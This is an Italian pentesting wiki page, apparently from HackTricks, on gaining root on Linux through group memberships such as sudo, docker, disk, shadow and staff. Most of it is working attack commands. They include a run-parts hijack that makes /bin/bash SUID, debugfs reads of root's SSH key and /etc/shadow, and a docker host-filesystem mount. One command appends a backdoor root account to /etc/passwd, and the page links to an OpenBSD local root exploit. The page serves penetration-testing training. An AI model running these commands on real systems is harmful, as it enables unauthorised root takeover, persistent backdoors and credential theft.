# Gruppi interessanti - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**A volte**, **di default (o perché qualche software ne ha bisogno)** nel file **/etc/sudoers** puoi trovare alcune di queste righe:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Questo significa che **qualsiasi utente che appartiene al gruppo sudo o admin può eseguire qualsiasi comando con sudo**.

Se è così, per **diventare root puoi semplicemente eseguire**:
```
sudo su
```
### PE - Metodo 2

Trova tutti i binari suid e verifica se esiste il binario **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Se scopri che il binario **pkexec è un binario SUID** e appartieni ai gruppi **sudo** o **admin**, probabilmente potrai eseguire binari come sudo usando `pkexec`.\
Questo perché tipicamente questi sono i gruppi definiti nella **polkit policy**. Questa policy identifica fondamentalmente quali gruppi possono usare `pkexec`. Controllala con:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Lì troverai quali gruppi sono autorizzati a eseguire **pkexec** e **di default**, in alcune distribuzioni Linux compaiono i gruppi **sudo** e **admin**.

Per **diventare root puoi eseguire**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Se provi a eseguire **pkexec** e ricevi questo **errore**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Non è perché non hai i permessi ma perché non sei connesso a una GUI**. E c'è una soluzione alternativa per questo problema qui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Hai bisogno di **2 sessioni ssh diverse**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Gruppo Wheel

**A volte**, **per impostazione predefinita** all'interno del file **/etc/sudoers** puoi trovare questa riga:
```
%wheel	ALL=(ALL:ALL) ALL
```
Questo significa che **qualsiasi utente appartenente al gruppo wheel può eseguire qualsiasi cosa con sudo**.

Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
```
sudo su
```
## Gruppo shadow

Gli utenti del **gruppo shadow** possono **leggere** il file **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Quindi, leggi il file e prova a **crack some hashes**.

Sottigliezza rapida sullo stato di lock quando si esegue il triaging degli hashes:
- Le voci con `!` o `*` sono generalmente non-interattive per i login con password.
- `!hash` di solito significa che una password è stata impostata e poi bloccata.
- `*` di solito significa che non è mai stato impostato un password hash valido.
Questo è utile per la classificazione degli account anche quando l'accesso diretto è bloccato.

## Staff Group

**staff**: Permette agli utenti di aggiungere modifiche locali al sistema (`/usr/local`) senza necessitare dei privilegi di root (nota che gli eseguibili in `/usr/local/bin` sono nella variabile PATH di ogni utente, e possono sovrascrivere gli eseguibili in `/bin` e `/usr/bin` con lo stesso nome). Confronta con il gruppo "adm", che è più correlato al monitoring/security. [\[source\]](https://wiki.debian.org/SystemGroups)

Nelle distribuzioni Debian, la variabile `$PATH` mostra che `/usr/local/` verrà eseguito con la massima priorità, sia che tu sia un utente privilegiato o no.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Se possiamo hijack alcuni programmi in `/usr/local`, possiamo ottenere facilmente root.

L'hijack del programma `run-parts` è un modo semplice per ottenere root, perché la maggior parte dei programmi viene eseguita tramite `run-parts` (es. crontab, al login via ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
o quando viene effettuato il login in una nuova ssh session.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Gruppo disk

Questo privilegio è quasi **equivalente a root access** in quanto puoi accedere a tutti i dati all'interno della macchina.

File:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Nota che usando debugfs puoi anche **scrivere file**. Per esempio, per copiare `/tmp/asd1.txt` in `/tmp/asd2.txt` puoi fare:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Tuttavia, se provi a **scrivere file appartenenti a root** (come `/etc/shadow` o `/etc/passwd`) otterrai un errore "**Permission denied**".

## Gruppo video

Usando il comando `w` puoi trovare **chi è connesso al sistema** e mostrerà un output come il seguente:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Il **tty1** indica che l'utente **yossi ha effettuato l'accesso fisicamente** a un terminale sulla macchina.

Il **video group** ha accesso a visualizzare l'output dello schermo. Fondamentalmente puoi osservare gli schermi. Per farlo devi **catturare l'immagine corrente sullo schermo** in formato raw e ottenere la risoluzione che lo schermo sta usando. I dati dello schermo possono essere salvati in `/dev/fb0` e puoi trovare la risoluzione di questo schermo in `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Per **aprire** l'**immagine raw** puoi usare **GIMP**, selezionare il file **`screen.raw`** e impostare come tipo di file **Raw image data**:

![](<../../../images/image (463).png>)

Poi modifica Width e Height con i valori usati sullo schermo e prova diversi Image Types (e seleziona quello che mostra meglio lo schermo):

![](<../../../images/image (317).png>)

## Gruppo root

Sembra che, per impostazione predefinita, i **membri del gruppo root** possano avere accesso per **modificare** alcuni file di configurazione di **service** o alcuni file di **libraries** o **altre cose interessanti** che potrebbero essere usate per elevare i privilegi...

**Controlla quali file i membri del gruppo root possono modificare**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Puoi **montare il root filesystem della macchina host sul volume di un'istanza**, così quando l'istanza si avvia carica immediatamente un `chroot` in quel volume. Questo ti dà effettivamente root sulla macchina.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Infine, se non ti piacciono le suggerimenti precedenti, o non funzionano per qualche motivo (docker api firewall?), puoi sempre provare a **run a privileged container and escape from it** come spiegato qui:


{{#ref}}
../container-security/
{{#endref}}

Se hai permessi di scrittura sul docker socket leggi [**questo post su come elevare i privilegi abusando del docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Gruppo lxc/lxd


{{#ref}}
./
{{#endref}}

## Gruppo adm

Di solito i **membri** del gruppo **`adm`** hanno i permessi per **leggere i file di log** situati in _/var/log/_.\
Pertanto, se hai compromesso un utente appartenente a questo gruppo dovresti assolutamente dare **un'occhiata ai log**.

## Gruppi Backup / Operator / lp / Mail

Questi gruppi sono spesso vettori di **credential-discovery** più che vettori diretti per root:
- **backup**: può esporre archivi con config, chiavi, DB dumps, o token.
- **operator**: accesso operativo specifico della piattaforma che può leak sensitive runtime data.
- **lp**: le code/spool di stampa possono contenere il contenuto dei documenti.
- **mail**: le mail spool possono esporre link di reset, OTP e credenziali interne.

Considera l'appartenenza a questi gruppi come una scoperta di esposizione di dati ad alto valore e sfrutta il riutilizzo di password/token per pivotare.

## Gruppo auth

Su OpenBSD il gruppo **auth** di solito può scrivere nelle cartelle _**/etc/skey**_ e _**/var/db/yubikey**_ se sono utilizzate.\
Questi permessi possono essere abusati con il seguente exploit per **elevare i privilegi** a root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
